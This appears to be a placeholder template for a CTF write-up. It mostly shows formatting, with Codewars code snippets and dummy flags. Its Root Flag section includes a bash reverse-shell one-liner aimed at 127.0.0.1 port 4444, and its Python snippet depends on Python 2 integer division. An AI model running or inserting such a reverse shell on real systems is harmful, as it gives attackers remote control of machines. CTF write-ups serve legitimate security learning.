This is just an example to show code formatting so who cares.Look here’s an image of my website, this is how you format an image.\\ Figure 1: My Website\\ Figure 2: Github ProfileMaybe we want to show some python code too, to let’s take a look at a snipped from codewars to format time as human readable.def make_readable(seconds): hours = seconds / 60**2 minutes = seconds/60 - hours*60 seconds = seconds - hours*(60**2) - minutes*60 return '%02d:%02d:%02d' % (hours, minutes, seconds)ExploitationIn order to gain our initial foothold we need to blablablabla. Here’s another code snippet just for fun.function sqInRect($lng, $wdth) { if($lng == $wdth) { return null; } $squares = array(); while($lng*$wdth &gt;= 1) { if($lng&gt;$wdth) { $base = $wdth; $lng = $lng - $base; } else { $base = $lng; $wdth = $wdth - $base; } array_push($squares, $base); } return $squares;}Above is the php code for the Rectangle into Squares kata solution from codewars.User FlagIn order to get the user flag, we simply need to use cat, because this is a template and not a real writeup!x@wartop:~$ cat user.txt6u6baafnd3d54fc3b47squhp4e2bhk67Root FlagThe privilege escalation for this box was not hard, because this is an example and I’ve got sudo password. Here’s some code to call a reverse shell bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1.\\ Figure 3: root.txt v5gw5zkh8rr3vmye7p4kaConclusionIn the conclusion sections I like to write a little bit about how the box seemed to me overall, where I struggled, and what I learned.References https://ryankozak.com/how-i-do-my-ctf-writeups/ https://github.com/Wandmalfarbe/pandoc-latex-template https://hackthebox.eu https://forum.hackthebox.eu" } ]
